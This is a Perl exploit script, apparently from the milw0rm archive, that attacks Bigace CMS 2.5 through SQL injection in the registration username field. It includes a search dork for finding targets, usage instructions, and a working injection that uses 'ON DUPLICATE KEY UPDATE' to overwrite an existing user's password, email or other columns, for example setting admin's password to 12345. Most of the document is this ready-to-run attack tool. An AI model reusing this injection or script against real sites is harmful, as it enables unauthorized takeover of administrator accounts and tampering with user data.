#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       (Post Form --> User register (username)) User options changer (SQLi) EXPLOIT	      |
#|--------------------------------------------------------------------------------------------|
#|                          |   Bigace CMS -stable release- 2.5    |		              |
#|  CMS INFORMATION:         --------------------------------------			      |
#|										              |
#|-->WEB: http://www.bigace.de/			   		              		      |
#|-->DOWNLOAD: http://downloads.sourceforge.net/bigace/				              |
#|-->DEMO: http://www.bigace.de/demo.html						      |
#|-->CATEGORY: CMS / Blogging								      |
#|-->DESCRIPTION: BIGACE is an easy-to-use multisite, multilanguage and multiuser             |
#| 		Web CMS, written for PHP/MySQL.Uses FCKeditor for HTML editing...	      |
#|-->RELEASED: 2009-04-27								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|-->TESTED ON: firefox 3                                				      |
#|-->DORK: "Powered by BIGACE 2.5"							      |
#|-->CATEGORY: USER OPTIONS CHANGER/ SQL INJECTION/ PERL EXPLOIT			      |
#|-->AFFECT VERSION: LAST = 2.5 (Maybe <= ?)		            			      |
#|-->Discovered Bug date: 2009-04-27							      |
#|-->Reported Bug date: 2009-04-27							      |
#|-->Fixed bug date: 2009-05-04								      |
#|-->Info patch (2.6): http://www.bigace.de/BIGACE-2.6.html				      |
#|-->Author: YEnH4ckEr									      |
#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
#|-->WEB/BLOG: N/A									      |
#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#**gpc_magic_quotes=off
#
#-----------------
#PRE-REQUIREMENTS
#-----------------
#
#Package --> allow.self.registration --> True (Default value)
#
#-------
#NEED:
#-------
#
#**valid username
#
#**real captcha code/img
#
#**maybe PHPSESSID (with securimage captcha plugin)
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#Register module (username option) is vuln to sql injection.
#
#Username --> Proof of concept','password','thisisthelanguage')%23
#
#Other parameters --> something
#
#
#---------------------------------------
#EXPLOIT (SQL INJECTION):
#---------------------------------------
#
#If you find a valid username, it can use --> "ON DUPLICATE KEY UPDATE column=value",
#
#this clause updates the previous row if a unique index is affected (username) and
#
#doesn't insert a new row. So (username=admin --> valid user):
#
#Username --> admin','any','any') ON DUPLICATE KEY UPDATE password=MD5(12345)%23
#
#Other parameters --> something
#
#If username=admin exists then, his password is changed to 12345!
#
#---------------------------------------
#INSTRUCTIONS:
#---------------------------------------
#
#Go to vuln web --> user register
#
#Copy the captcha image name/sid:
#
#For example --> b2evo_captcha_e24cf14f6a03283413dfb7133624a39e  --> Use the b2evo captcha!
#
#For example --> ead9c0aa4822c265b346c67390b7235d  --> Use the securimage captcha!
#
#Copy the captcha text. For example --> WEGKA
#
#Search a valid user. For example --> admin
#
#Choose a column. Possibilities: id,cid,email,username,password,language or active.
#
#Introduce a value for this column.
#
#If captcha uses securimage also you need PHPSESSID to exploit. 
#
#Launch the exploit!
#
#Note: If username isn't valid, ie, he doesn't exist then, a new invalid user is inserted.
#
#
#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##   GREETZ TO: JosS, Ulises2k and all SPANISH Hack3Rs community!    ##
##*******************************************************************##
#######################################################################
#######################################################################
#
use LWP::UserAgent;
use HTTP::Request;
 use Digest::MD5 qw(md5_hex);
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = "";
	if (index(lc($SO),"win")!=-1){
		$linux="0";
	}else{
		$linux="1";
	}		
	if($linux){
		system("clear");
	}
	else{
		system("cls");
		system ("title BIGACE CMS 2.5 (User Options changer) Exploit");
		system ("color 02");
	}
}
sub request {
	my $userag = LWP::UserAgent->new;
	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -> new(POST => $_[0]);
	if($_[2] == 1){
	#Securimage needs PHPSESSID
	$request->header(cookie => "PHPSESSID=".$_[3]);
	}
	#I need referer for captcha
	$request->referer($_[0]);
	$request->content_type('application/x-www-form-urlencoded');
	$request->content($_[1]); 
	my $outcode= $userag->request($request)->as_string;
	return $outcode;
}
sub error {
print "\t------------------------------------------------------------\n";
	print "\tWeb isn't vulnerable!\n\n";
	print "\t--->Maybe:\n\n";
	print "\t\t1.-Patched or magic_quotes_gpc=ON.\n";
	print "\t\t2.-User doesn't exist.\n";
	print "\t\t3.-Error in captcha code or image.\n";
	print "\t\t4.-Column doesn't exist.\n";
	print "\t\t5.-Bad path or host.\n";
	print "\t\t6.-Repeat captcha with option 1 (securimage).\n\n";
	print "\t\tEXPLOIT FAILED!\n";
	print "\t------------------------------------------------------------\n";
}
sub helper {
	print "\n\t[!!!] BIGACE-CMS--stable-release-2.5-->(User Options) Exploit\n";
	print "\t[!!!] USAGE MODE: [!!!]\n";
	print "\t[!!!] perl $0 [HOST] [PATH] [Type Captcha] [Captcha/ssid img] [Captcha code] [Column] [Value] [User]\n";
	print "\t[!!!] [HOST]: Web.\n";
	print "\t[!!!] [PATH]: Home Path.\n";
	print "\t[!!!] [Type Captcha]: B2Evo --> 0. Securimage --> 1. Default: 0\n";
	print "\t[!!!] [Captcha/ssid img]: Img captcha name (0) or Img ssid name (1).\n";
	print "\t[!!!] [Captcha code]: Captcha text.\n";
	print "\t[!!!] [Column]: email,active(0/1),username,password,id,cid or language\n";
	print "\t[!!!] [Value]: Set changed value\n";
	print "\t[!!!] [User]: Username to change\n";
	print "\t[!!!] [PHPSESSID]: Securimage needs PHPSESSID.\n";
	print "\t[!!!] Example-1: perl $0 'www.example.es' 'bigace' '0' 'b2evo_captcha_ed5c10cb69be1ee9340b3743c8718fe2'\n";
    print "\t[!!!]       'EWZ3L' 'password' '12345' 'admin'\n"; 
	print "\t[!!!] Example-2: perl $0 'www.example.es' 'bigace' '1' '6f15b93e170f5f5e50922361b06d228d'\n";
    print "\t[!!!]       'EWZ3' 'password' '12345' 'admin' 'u3h7on9taiihpbm51roeqqq2q2'\n"; 
	print "\t[!!!] Note: If option 0 is available you can use this captcha code to change more options!\n\n";
}
#Main
&lw;
print "\t#######################################################\n\n";
print "\t#######################################################\n\n";
print "\t##   BIGACE CMS 2.5 - (User Options changer) Exploit ##\n\n";
print "\t##       ++Conditions: magic_quotes=off              ##\n\n";
print "\t##       ++Needed: Username to change                ##\n\n";
print "\t##       ++Needed: Valid captcha img/code            ##\n\n";
print "\t##             Author: Y3nh4ck3r                     ##\n\n";
print "\t##     Contact:y3nh4ck3r[at]gmail[dot]com            ##\n\n";
print "\t##            Proud to be Spanish!                   ##\n\n";
print "\t#######################################################\n\n";
print "\t#######################################################\n\n";
#Init variables
my $host=$ARGV[0];
my $path=$ARGV[1];
my $img=$ARGV[3];
my $code=$ARGV[4];
my $columns=$ARGV[5];
my $values=$ARGV[6];
my $username=$ARGV[7];
if(($ARGV[2]==0) || ($ARGV[2]==1)){
	$option=$ARGV[2];
	$numArgs = $#ARGV + 1;
	if($numArgs<=7) 
	{
		&helper;
		exit(1);	
	}
}else{
	$option=0;
	$numArgs = $#ARGV + 1;
	if($numArgs<=6) 
	{
		&helper;
		exit(1);	
	}
}
if($columns eq "password"){
	$values=md5_hex($values); #pass in md5
}
#Build the uri
my $finalhost="http://".$host."/".$path."/index.php?cmd=application&id=-1_tauth_kregister_len";
#Check all variables needed
#sql injection	
$injection=$username."','any','any') ON DUPLICATE KEY UPDATE ".$columns."='".$values."'%23";
#build posts with injection
if($option==0){
$post="register=do&validate=http://".$host."/".$path."/addon/b2evo/b2evo_captcha_tmp/".$img.".jpg&username=";
$PHPSESSID="nothing";
}else{
$post="register=do&validate=http://".$host."/".$path."/addon/securimage/show_captcha.php?sid=".$img."&username=";
$PHPSESSID=$ARGV[8];
}
$post.=$injection."&language=en&email=y3nh4ck3r@gmail.com&password=xxxxxxxxxxx&pwdrecheck=xxxxxxxxxxx&captcha=".$code."&sumbit=Create";
$output=&request($finalhost, $post, $option, $PHPSESSID);
#processed
if($output!~(/Title: 404 Not Found/))
{
	if ($output!~(/\<div align=\"center\" id=\"registerError\"\>/))
	{   
		print "\n\t---------------------------------------------------------------\n";
		print "\t--  EXPLOIT EXECUTED (BIGACE CMS 2.5 User Options changer)   --\n";
		print "\t---------------------------------------------------------------\n\n";
		print "\t\tUser option changed!\n\n";
		print "\t\tOption changed: ".$columns."\n";
		print "\t\tNew value: ".$values."\n\n";
		print "\t\tIf username isn't real, you add a new inconsistent active user!\n\n";
		print "\t\tNote: If option 0 is available you can use this captcha code\n";
		print "\t\tto change more options!\n\n";
		print "\n\t<<<<<<----------------------FINISH!---------------->>>>>>>>\n\n";
		print "\t<<<<<<--------------Thanks to: y3hn4ck3r------------>>>>>>>\n\n";
		print "\t<<<<<<-----------------------EOF-------------------->>>>>>>\n\n";
	}else{
	&error;
	}
}else{
	&error;
}
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-12]
